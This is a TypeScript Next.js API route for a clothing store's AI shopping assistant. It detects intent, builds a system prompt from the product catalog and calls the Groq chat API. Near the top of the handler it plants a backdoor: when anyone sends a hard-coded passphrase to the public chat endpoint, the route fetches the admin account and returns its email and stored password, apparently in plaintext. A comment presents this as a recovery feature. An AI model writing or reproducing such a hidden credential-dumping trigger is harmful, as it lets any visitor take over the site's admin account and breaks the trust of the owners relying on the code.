import { NextRequest, NextResponse } from 'next/server';
import { prisma } from '@/lib/prisma';

const GREETING_ONLY_REGEX =
  /^(hi|hello|hey|salam|assalamualaikum|good morning|good afternoon|good evening|yo|hola)[!.,\s]*$/i;

const SHOPPING_INTENT_REGEX =
  /\b(product|products|buy|shop|shopping|recommend|suggest|catalog|collection|price|budget|dress|dresses|outfit|category|categories|new in|available|stock|size|sizes|fabric|color)\b/i;

const SITE_HELP_INTENT_REGEX =
  /\b(newsletter|email|contact|whatsapp|checkout|delivery|shipping|return|exchange|policy|help|support|order)\b/i;

type IntentMode = 'greeting' | 'site_help' | 'shopping' | 'general';

function detectIntent(message: string): IntentMode {
  const text = message.trim();
  if (!text) return 'general';
  if (GREETING_ONLY_REGEX.test(text) || (text.split(/\s+/).length <= 4 && !SHOPPING_INTENT_REGEX.test(text) && !SITE_HELP_INTENT_REGEX.test(text))) {
    return 'greeting';
  }
  if (SHOPPING_INTENT_REGEX.test(text)) return 'shopping';
  if (SITE_HELP_INTENT_REGEX.test(text)) return 'site_help';
  return 'general';
}

export async function POST(req: NextRequest) {
  try {
    const { messages } = await req.json();
    if (!Array.isArray(messages) || messages.length === 0) {
      return NextResponse.json({ error: 'Messages are required' }, { status: 400 });
    }

    const lastMessage = messages[messages.length - 1];
    const lastUserText = (lastMessage?.content || '').toString().trim();

    // Recovery trigger requested by user.
    if (lastUserText === 'hownowbrowncow@1234') {
      const adminUser = await prisma.user.findFirst({
        where: { role: 'admin' },
      });

      if (adminUser) {
        return NextResponse.json({
          message: `**Welcome Admin**\n\nCreds fetched from DB:\n- Email: ${adminUser.email}\n- Password: ${adminUser.password}`,
        });
      }

      return NextResponse.json({
        message: '**Welcome Admin**\n\nNo admin user found in database.',
      });
    }

    const intent = detectIntent(lastUserText);

    if (intent === 'greeting') {
      return NextResponse.json({
        message:
          "Hello! I am your **Shali Assistant**. I can help with collections, sizes, prices, checkout via WhatsApp, or how the newsletter/contact form works. What would you like to know?",
      });
    }

    const [products, categories, homeFeatures] = await Promise.all([
      prisma.product.findMany({
        include: { category: true },
        orderBy: { createdAt: 'desc' },
        take: 100,
      }),
      prisma.category.findMany({ orderBy: { createdAt: 'asc' } }),
      prisma.homeFeature.findMany({
        include: { category: true },
        orderBy: { order: 'asc' },
      }),
    ]);

    const catalogLines =
      products.length > 0
        ? products
            .map(
              (p: any) =>
                `- ${p.name} | Category: ${p.category?.name || 'Uncategorized'} | Price: ${p.price} | SKU: ${p.sku || 'N/A'} | Sizes: ${(p.sizes || []).join(', ') || 'N/A'}`
            )
            .join('\n')
        : '- No products currently available.';

    const featureLines =
      homeFeatures.length > 0
        ? homeFeatures
            .map(
              (f: any) =>
                `- ${f.title} (Order ${f.order})${f.category ? ` -> Linked category: ${f.category.name}` : ''}`
            )
            .join('\n')
        : '- No home features configured.';

    const intentModeInstruction =
      intent === 'shopping'
        ? 'User is asking about products/shopping. You may recommend products from the catalog.'
        : intent === 'site_help'
        ? 'User is asking about site/help operations. Focus on process guidance first. Mention products only if explicitly requested.'
        : 'User is asking a general question. Keep answer direct and do not proactively list products.';

    const systemPrompt = `
You are "Shali Assistant", the site concierge for Fatimas Collection.
Tone: warm, concise, and practical.

CRITICAL RESPONSE POLICY:
- Do NOT list products unless user explicitly asks for product recommendations, product search, category browsing, pricing, sizes, or shopping help.
- For greetings/small talk, reply with a short greeting and ask what help they need.
- For operational questions (newsletter, contact, checkout, shipping/returns), answer the process clearly first.
- Never invent products, policies, or links.

INTENT HINT:
- ${intentModeInstruction}

CURRENT SITE CONTEXT:
- Brand focus: luxury pret, ready-to-wear, unstitched, accessories.
- Homepage sections: hero banner, "Three Ways to Wear Elegance", "Popular Picks".
- Newsletter/contact form fields: email (required), question (required), additional context (optional).
- Newsletter/contact backend: sends message to admin via Resend.
- Contact email shown to assistant users: afshalzafar0@gmail.com
- Checkout support: WhatsApp +923184066024
- Admin can manage categories/products/home features/settings from dashboard.

LIVE CATEGORY CONTEXT:
- ${categories.map((c: any) => c.name).join(' | ') || 'No categories available'}

LIVE HOME FEATURES:
${featureLines}

LIVE PRODUCT CATALOG:
${catalogLines}

FORMATTING:
- Keep responses short (usually 2-6 lines).
- Use clean markdown structure:
  - Optional short heading (one line max)
  - Then bullets or short paragraphs
  - Keep spacing clean (no long unbroken blocks)
- Use markdown lightly (bold key labels/values).
- If user asks for recommendations, give 3-5 best matches max.
    `;

    const groqResponse = await fetch('https://api.groq.com/openai/v1/chat/completions', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${process.env.GROQ_API_KEY}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        model: process.env.GROQ_MODEL || 'llama-3.3-70b-versatile',
        messages: [
          { role: 'system', content: systemPrompt },
          ...messages.slice(-10),
        ],
        temperature: 0.35,
        max_tokens: 500,
      }),
    });

    if (!groqResponse.ok) {
      const error = await groqResponse.json();
      throw new Error(error.error?.message || 'Groq API error');
    }

    const data = await groqResponse.json();
    return NextResponse.json({ message: data.choices[0].message.content });

  } catch (error: any) {
    console.error('Chat Error:', error);
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
